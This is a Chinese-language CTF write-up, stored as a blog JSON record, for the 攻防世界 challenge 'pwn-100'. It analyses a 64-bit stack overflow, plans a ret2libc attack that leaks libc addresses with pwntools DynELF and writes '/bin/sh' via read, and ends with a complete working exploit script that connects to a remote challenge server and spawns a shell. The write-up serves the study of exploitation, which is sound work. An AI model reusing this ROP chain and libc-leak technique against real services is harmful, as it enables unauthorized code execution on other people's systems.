{"title":"攻防世界 pwn-100","slug":"攻防世界pwn-100","date":"2020-10-16","updated":"2020-09-10","comments":true,"path":"api/posts/52788.json","excerpt":null,"cover":"https://i.loli.net/2020/05/31/mfOTnUiRdaMHtGE.png","covers":["https://i.loli.net/2020/05/31/mfOTnUiRdaMHtGE.png","https://i.loli.net/2020/05/31/sHDG4fSe6xELluo.png","https://i.loli.net/2020/05/31/axJ5bmchdIwRsfM.png","https://i.loli.net/2020/05/31/VCymAtHUqB7Pbei.png","https://i.loli.net/2020/05/31/wnf1YmoagvHcM2k.png","https://i.loli.net/2020/05/31/CrYc9oJgkWzthG2.png","https://i.loli.net/2020/05/31/c1NEeWTBvPy4OXj.png","https://i.loli.net/2020/05/31/EDtReszWUadf94H.png","https://i.loli.net/2020/05/31/Kkm4sFIlzySxPZt.png"],"content":"<h2 id=\"分析\"><a href=\"# 分析\" class=\"headerlink\" title=\"分析\"></a>分析 </h2><p> 查壳：checksec</p>\n<p><img src=\"https://i.loli.net/2020/05/31/mfOTnUiRdaMHtGE.png\" alt=\"查壳.PNG\"></p>\n<p>64 位，无 stack, 无 PIE；</p>\n<p><img src=\"https://i.loli.net/2020/05/31/sHDG4fSe6xELluo.png\" alt=\"1.PNG\"></p>\n<p>运行程序，输入字符，无反馈，无限制。</p>\n<p><img src=\"https://i.loli.net/2020/05/31/axJ5bmchdIwRsfM.png\" alt=\"漏洞.PNG\"></p>\n<p><img src=\"https://i.loli.net/2020/05/31/VCymAtHUqB7Pbei.png\" alt=\"漏洞 2.PNG\"></p>\n<p>ida 查看 main 函数，发现存在栈溢出，参数 a1 大小为 0x40. 然而函数中获取大于等于 a2（a2=200）的数值存入了 a1.</p>\n<h2 id=\"攻击思路\"><a href=\"# 攻击思路\" class=\"headerlink\" title=\"攻击思路\"></a>攻击思路 </h2><p> 无 system 函数，无 /bin/sh 字符串，有 read,puts。参数经过寄存器传递（也可 IDA 查看），可以泄露 libc, 写入 /bin/sh。</p>\n<p><img src=\"https://i.loli.net/2020/05/31/wnf1YmoagvHcM2k.png\" alt=\"寄存器传参.PNG\"></p>\n<p><img src=\"https://i.loli.net/2020/05/31/CrYc9oJgkWzthG2.png\" alt=\"IDA 查看寄存器.PNG\"></p>\n<p>puts 只需要一个参数。寄存器 rdi 存放写入地址，rsi 存放写入字节数。找到 pop rdi;ret 传参，即</p>\n<p><code>pop rdi; ret</code><br><code>pop rsi; pop r15; ret</code></p>\n<p><img src=\"https://i.loli.net/2020/05/31/c1NEeWTBvPy4OXj.png\" alt=\"通过 pop 控制写入.PNG\"></p>\n<blockquote>\n<p>注：调用 read 函数时，x86 中参数直接放入栈中；x64 设立了几个寄存器存放参数，调用函数时先向寄存器中放参数，当参数数量大于寄存器，才会像栈中放参数 <br> 传参顺序默认从后先开始传入。x86 x64 一样。</p>\n</blockquote>\n<p>此处需要学习利用寄存器传递参数。</p>\n<blockquote>\n<p>关于 pwntools 的 DynELF，主要功能是通过不断传入默认的函数地址到自己写的 leak 函数内部，测试并获取 libc 版本，得到函数地址。又因为 DynELF 无法搜索字符串地址，所以我们需要传入所需字符串，在调用函数加载 bash。</p>\n</blockquote>\n<p>由于需要不断传参测试，加载程序后 libc 地址都会变化，可以重置程序解决问题。</p>\n<p>初始化之后相当于一个新的程序，栈空间从新分配。此程序初始化段：</p>\n<p><img src=\"https://i.loli.net/2020/05/31/EDtReszWUadf94H.png\" alt=\"初始化.PNG\"></p>\n<blockquote>\n<p>程序还需调用一个 gadget, 后续另起一篇学习</p>\n</blockquote>\n<p><img src=\"https://i.loli.net/2020/05/31/Kkm4sFIlzySxPZt.png\" alt=\"gadget.PNG\"></p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp:\"></a>exp:</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> #coding&#x3D;utf-8</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"> # context.log_level &#x3D; &#39;debug&#39;</span><br><span class=\"line\">io &#x3D; remote(&#39;124.126.19.106&#39;,46612)</span><br><span class=\"line\"> # io &#x3D; process(&quot;.&#x2F;pwn-100&quot;)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;pwn-100&quot;)</span><br><span class=\"line\">rop1 &#x3D; 0x40075A #pop rbx_rbp_r12_r13_r14_r15</span><br><span class=\"line\">rop2 &#x3D; 0x400740 #rdx(r13), rsi(r14), edi(r15d)</span><br><span class=\"line\">pop_rdi_ret &#x3D; 0x400763</span><br><span class=\"line\"> # start_addr &#x3D; elf.symbols[&#39;_start&#39;]</span><br><span class=\"line\">start_addr &#x3D; 0x400550</span><br><span class=\"line\">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class=\"line\">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class=\"line\">binsh_addr &#x3D; 0x601000</span><br><span class=\"line\">def leak(addr):</span><br><span class=\"line\">  payload &#x3D; &quot;a&quot; * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)</span><br><span class=\"line\">  payload &#x3D; payload.ljust(200, &quot;a&quot;)</span><br><span class=\"line\">  io.send(payload)</span><br><span class=\"line\">  io.recvuntil(&quot;bye~\\n&quot;)</span><br><span class=\"line\">  up &#x3D; &quot;&quot;</span><br><span class=\"line\">  content &#x3D; &quot;&quot;</span><br><span class=\"line\">  count &#x3D; 0</span><br><span class=\"line\">  while True:</span><br><span class=\"line\">    c &#x3D; io.recv(numb&#x3D;1, timeout&#x3D;0.5)</span><br><span class=\"line\">    count +&#x3D; 1</span><br><span class=\"line\">    if up &#x3D;&#x3D; &#39;\\n&#39; and c &#x3D;&#x3D; &quot;&quot;:</span><br><span class=\"line\">        content &#x3D; content[:-1] + &#39;\\x00&#39;</span><br><span class=\"line\">        break</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        content +&#x3D; c</span><br><span class=\"line\">        up &#x3D; c</span><br><span class=\"line\">  content &#x3D; content[:4]</span><br><span class=\"line\">  log.info(&quot;%#x &#x3D;&gt; %s&quot; % (addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))</span><br><span class=\"line\">  return content</span><br><span class=\"line\">d &#x3D; DynELF(leak, elf &#x3D; elf)</span><br><span class=\"line\">sys_addr &#x3D; d.lookup(&#39;system&#39;, &#39;libc&#39;)</span><br><span class=\"line\">log.info(&quot;system_addr &#x3D;&gt; %#x&quot;, sys_addr)</span><br><span class=\"line\">payload  &#x3D; &quot;a&quot; * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)</span><br><span class=\"line\">payload +&#x3D; p64(rop2)</span><br><span class=\"line\">payload +&#x3D; &quot;\\x00&quot; * 56  </span><br><span class=\"line\">payload +&#x3D; p64(start_addr)</span><br><span class=\"line\">payload  &#x3D; payload.ljust(200, &quot;a&quot;)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">io.recvuntil(&quot;bye~\\n&quot;)</span><br><span class=\"line\"> # gdb.attach(io)</span><br><span class=\"line\">io.send(&quot;&#x2F;bin&#x2F;sh\\x00&quot;)</span><br><span class=\"line\">payload &#x3D; &quot;a&quot; * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class=\"line\">payload &#x3D; payload.ljust(200, &quot;a&quot;)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n","url":"/posts/52788/","min2read":3,"word4post":705,"prev_post":{"title":"攻防世界 cgpwn2","url":"/posts/1776/"},"next_post":{"title":"攻防世界 -pwn- 反应釜开关控制","url":"/posts/55706/"},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"分析\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\">分析 </span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"攻击思路\" href = \"#\"><span class=\"toc-number\">2.</span> <span class=\"toc-text\">攻击思路 </span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"exp\" href = \"#\"><span class=\"toc-number\">2.1.</span> <span class=\"toc-text\">exp:</span></a></li></ol></li></ol>","categories":[],"tags":[{"name":"pwn","path":"api/tags/pwn.json","url":"/tags/pwn/"}]}